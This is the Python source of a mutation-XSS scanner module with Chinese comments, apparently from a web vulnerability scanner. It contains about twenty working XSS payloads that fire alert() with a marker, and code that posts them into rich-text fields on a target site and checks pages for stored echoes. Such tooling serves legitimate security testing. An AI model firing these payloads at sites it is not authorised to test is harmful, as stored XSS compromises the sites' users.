"""
富文本编辑器 / Mutation XSS 检测 — P1 关键能力。

应用场景：
- CKEditor / TinyMCE / Quill / Slate 等富文本输入框
- Markdown 渲染器（marked.js / showdown / markdown-it）
- 评论 / 工单 / 知识库 / 博客的"富文本"输入
- 站内消息 / IM 富文本

漏洞原理（Mutation XSS）：
- 用户提交富文本 → 服务端 sanitize（DOMPurify/HtmlSanitizer）
- 浏览器 parse 后 DOM 结构发生 mutation（如 <noscript> 内的内容会被重新解释）
- mutation 后变成可执行 payload
- 经典 case：DOMPurify < 2.x.x 的 mXSS、Edge 引擎下的 `<a><math><mtext><table><mglyph><style>`

工作流：
1. 发现"富文本"输入点（field 名含 content/body/description/comment/html 等）
2. 发标准 mXSS payload（精选 30 个真实赏金案例 payload）
3. 提交后从读取端查回显
4. 浏览器层渲染回显的 HTML，监听 alert/console
5. 命中即报 mXSS（confidence 0.9+）

特点：
- 只对"明确富文本"的字段测（防误伤纯文本字段）
- 浏览器层强依赖：mXSS 必须实际渲染才可见
- payload 来自 cure53 mXSS 数据集 + sonarsource 研究
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse

import httpx

from core.xss.http_engine import _gen_marker
from core.xss.models import (
    ContextType,
    EchoMatch,
    InjectionPoint,
    InjectionTarget,
    XssCandidate,
    XssType,
)

if TYPE_CHECKING:
    from core.sitemap import Sitemap

log = logging.getLogger(__name__)


# ============================================================
# Mutation XSS Payload 集（真实赏金案例）
# ============================================================
def build_mxss_payloads(marker: str) -> list[str]:
    """生成 mutation XSS payload。所有 payload 都含 marker。"""
    return [
        # DOMPurify < 2.0.17 mXSS（HTML→XML 命名空间切换）
        f'<form><math><mtext></form><form><mglyph><style></math><img src onerror="alert({marker})"></style></mglyph></form>',
        # SVG foreignObject mXSS
        f'<svg><p><style><a id="</style><img src=x onerror=alert({marker})>">',
        # Noscript context（很多 sanitizer 忽略 <noscript> 内）
        f'<noscript><p title="</noscript><img src=x onerror=alert({marker})>">',
        # Template element mXSS
        f'<template><img src=x onerror=alert({marker})></template>',
        # iframe srcdoc XSS（很多富文本允许 iframe 但不审 srcdoc）
        f'<iframe srcdoc="&lt;img src=x onerror=alert({marker})&gt;"></iframe>',
        # Markdown image URL JS（marked/showdown）
        f'![]("onerror="alert({marker})" foo=")',
        f'[click](javascript:alert({marker}))',
        # HTML entity 混淆
        f'<a href="&#106;avascript:alert({marker})">click</a>',
        f'<a href="javascript&#58;alert({marker})">click</a>',
        # data: URI（有些富文本允许 data 协议）
        f'<a href="data:text/html;base64,{_b64_payload_marker(marker)}">click</a>',
        # CKEditor / TinyMCE 特殊
        f'<img src=x onerror="javascript:alert({marker})">',
        # Quill / Slate JSON Ops 注入（保留为 HTML payload）
        f'<span style="background-image:url(javascript:alert({marker}))">x</span>',
        # 嵌套属性逃逸
        f'<a href="x" onclick="alert({marker})">click</a>',
        # SVG XSS classics
        f'<svg><animate onbegin=alert({marker}) attributeName=x dur=1s>',
        f'<svg><set onbegin=alert({marker}) attributeName=x>',
        # MathML XSS
        f'<math><maction actiontype="statusline#x" xlink:href="javascript:alert({marker})">click</maction></math>',
        # Body / Style mXSS
        f'<style>@import "javascript:alert({marker})";</style>',
        # Nested encoding
        f'<x onclick="alert({marker})">x</x>',
        # Markdown HTML in code block
        f'```\n<img src=x onerror=alert({marker})>\n```',
        # XML CDATA
        f'<![CDATA[<svg/onload=alert({marker})>]]>',
    ]


def _b64_payload_marker(marker: str) -> str:
    import base64
    raw = f'<script>alert("{marker}")</script>'
    return base64.b64encode(raw.encode()).decode()


# ============================================================
# 富文本字段识别
# ============================================================
RICHTEXT_FIELD_HINTS = [
    "content", "body", "description", "desc", "html", "rich",
    "richtext", "rich_text", "comment", "msg", "message", "note",
    "bio", "intro", "summary", "article", "post", "memo",
    "remark", "review", "feedback", "answer", "reply",
]


def is_likely_richtext_target(target: InjectionTarget) -> bool:
    """判断一个注入点是否可能是富文本字段。"""
    name = (target.param_name or "").lower()
    for hint in RICHTEXT_FIELD_HINTS:
        if hint in name:
            return True
    # 也可以根据 content_type 判断（HTML/Markdown）
    ct = (target.content_type or "").lower()
    if "html" in ct or "markdown" in ct:
        return True
    # body 长度提示（mvp 不可靠，跳过）
    return False


# ============================================================
# Mutation XSS 扫描器
# ============================================================
class MutationXssScanner:
    """富文本 / Mutation XSS 扫描器。"""

    def __init__(
        self,
        sitemap: "Sitemap",
        proxy: str = "",
        auth_headers: dict = None,
        cookies: dict = None,
        timeout: float = 15.0,
        on_progress: Optional[callable] = None,
        max_targets: int = 30,
        max_payloads_per_target: int = 6,
        wait_for_persistence: float = 1.5,
    ):
        self.sitemap = sitemap
        self.proxy = proxy or None
        self.auth_headers = auth_headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.on_progress = on_progress
        self.max_targets = max_targets
        self.max_payloads_per_target = max_payloads_per_target
        self.wait_for_persistence = wait_for_persistence

    def _report(self, msg: str):
        if self.on_progress:
            try:
                self.on_progress(msg)
            except Exception:
                pass

    async def scan(self, write_targets: list[InjectionTarget]) -> list[XssCandidate]:
        """主流程：选富文本目标 → 注入 mXSS payload → 检测回显 → 浏览器验证。"""
        # 1. 过滤出富文本目标
        rt_targets = [t for t in write_targets if is_likely_richtext_target(t)]
        if not rt_targets:
            self._report("  无富文本字段，跳过 Mutation XSS 扫描")
            return []
        rt_targets = rt_targets[: self.max_targets]
        self._report(f"  📝 Mutation XSS 选定 {len(rt_targets)} 个富文本目标")

        # 2. 收集读取页（同 stored_tracker）
        read_urls = self._collect_read_urls()
        self._report(f"  📖 收集 {len(read_urls)} 个读取页用于 mXSS 回显检测")

        candidates: list[XssCandidate] = []
        sem = asyncio.Semaphore(3)

        async with httpx.AsyncClient(
            proxy=self.proxy, timeout=self.timeout, verify=False,
            follow_redirects=False, headers=self.auth_headers, cookies=self.cookies,
            limits=httpx.Limits(max_connections=15),
        ) as client:

            async def _scan_one(tgt: InjectionTarget):
                async with sem:
                    try:
                        cands = await self._scan_richtext_target(client, tgt, read_urls)
                        candidates.extend(cands)
                    except Exception as e:
                        log.debug("mxss scan error: %s", e)

            await asyncio.gather(*[_scan_one(t) for t in rt_targets])

        if candidates:
            self._report(f"  ✅ Mutation XSS: 发现 {len(candidates)} 个候选")
        return candidates

    def _collect_read_urls(self, max_urls: int = 40) -> list[str]:
        """同 stored_tracker 的逻辑（简化）。"""
        urls = []
        seen = set()
        pages = getattr(self.sitemap, "pages", {}) or {}
        for u in pages.keys():
            if u not in seen:
                seen.add(u)
                urls.append(u)
                if len(urls) >= max_urls:
                    return urls
        apis = getattr(self.sitemap, "apis", {}) or {}
        for k, info in apis.items():
            if hasattr(info, "url"):
                url = getattr(info, "url", "")
                method = (getattr(info, "method", "GET") or "GET").upper()
            elif isinstance(info, dict):
                url = info.get("url", "")
                method = (info.get("method", "GET") or "GET").upper()
            else:
                continue
            if method != "GET":
                continue
            base = url.split("?")[0]
            if base not in seen:
                seen.add(base)
                urls.append(url)
                if len(urls) >= max_urls:
                    return urls
        return urls

    async def _scan_richtext_target(
        self,
        client: httpx.AsyncClient,
        tgt: InjectionTarget,
        read_urls: list[str],
    ) -> list[XssCandidate]:
        """对一个富文本字段注入 mXSS payload 集 + 检测回显。"""
        out: list[XssCandidate] = []
        payloads_pool = []
        for _ in range(self.max_payloads_per_target):
            marker = "mxss" + _gen_marker("m")
            for p in build_mxss_payloads(marker)[:1]:  # 每个 marker 配 1 payload
                payloads_pool.append((marker, p))
            if len(payloads_pool) >= self.max_payloads_per_target:
                break

        # 多样化：实际给每个 payload 单独的 marker
        payloads_pool = []
        sample_markers = [("mxss" + _gen_marker("m")) for _ in range(self.max_payloads_per_target)]
        full_pool = []
        # 取所有 payload 模板
        if sample_markers:
            first_marker = sample_markers[0]
            templates = build_mxss_payloads(first_marker)
            for i in range(min(self.max_payloads_per_target, len(templates))):
                marker = sample_markers[i] if i < len(sample_markers) else first_marker
                # 把模板里的 first_marker 替换为当前 marker
                p = templates[i].replace(first_marker, marker)
                full_pool.append((marker, p))
        payloads_pool = full_pool

        for marker, payload in payloads_pool:
            try:
                ok = await self._send_payload(client, tgt, payload)
                if not ok:
                    continue
            except Exception:
                continue

        # 等持久化后查回显
        await asyncio.sleep(self.wait_for_persistence)

        for marker, payload in payloads_pool:
            try:
                for read_url in read_urls[:15]:
                    try:
                        resp = await client.get(read_url)
                        body = resp.text or ""
                        if marker not in body:
                            continue
                        # 找到回显，构造 candidate
                        idx = body.find(marker)
                        excerpt = body[max(0, idx - 200): idx + len(marker) + 200]
                        cand_target = InjectionTarget(
                            url=read_url,
                            method="GET",
                            injection_point=tgt.injection_point,
                            param_name=tgt.param_name,
                            original_value=tgt.original_value,
                            headers=dict(tgt.headers or {}),
                            source_flow_id=f"mxss_via:{tgt.method} {tgt.url}",
                        )
                        cand = XssCandidate(
                            target=cand_target,
                            payload=payload,
                            marker=marker,
                            echo_matches=[EchoMatch(
                                snippet=excerpt,
                                offset=idx,
                                context=ContextType.HTML_TEXT,
                                encoded=False,
                            )],
                            confidence=0.8,  # mXSS 需要浏览器验证
                            xss_type=XssType.MUTATION,
                            request_packet=(
                                f"[写入] {tgt.method} {tgt.url} 字段 {tgt.param_name}\n"
                                f"Payload: {payload[:500]}\n"
                                f"[读取] GET {read_url}\n"
                                f"Marker: {marker}"
                            )[:8000],
                            response_packet=body[:30000],
                            response_status=resp.status_code,
                            response_content_type=resp.headers.get("content-type", ""),
                            scanner="xss_mutation",
                        )
                        out.append(cand)
                        # 一个 payload 找到一个回显页即停（避免重复）
                        break
                    except Exception:
                        continue
            except Exception:
                continue

        return out

    async def _send_payload(
        self, client: httpx.AsyncClient, tgt: InjectionTarget, payload: str
    ) -> bool:
        """复用 stored_tracker 的写入逻辑。"""
        from urllib.parse import urlparse, parse_qsl, urlencode
        method = tgt.method.upper()
        headers = dict(tgt.headers or {})
        headers.pop("Content-Length", None)
        headers.pop("content-length", None)

        try:
            if tgt.injection_point == InjectionPoint.URL_PARAM:
                parsed = urlparse(tgt.url)
                existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
                existing[tgt.param_name] = payload
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(existing)}"
                await client.request(method, new_url, headers=headers)
                return True
            if tgt.injection_point == InjectionPoint.BODY_FORM:
                await client.request(method, tgt.url, headers=headers,
                                     data={tgt.param_name: payload})
                return True
            if tgt.injection_point == InjectionPoint.BODY_JSON:
                obj = {}
                try:
                    if tgt.body_template:
                        obj = json.loads(tgt.body_template)
                except Exception:
                    obj = {}
                if not isinstance(obj, dict):
                    obj = {}
                obj[tgt.param_name] = payload
                headers.setdefault("Content-Type", "application/json")
                await client.request(method, tgt.url, headers=headers,
                                     content=json.dumps(obj))
                return True
            if tgt.injection_point == InjectionPoint.BODY_MULTIPART:
                await client.request(method, tgt.url, headers=headers,
                                     files={tgt.param_name: (None, payload)})
                return True
        except Exception:
            return False
        return False
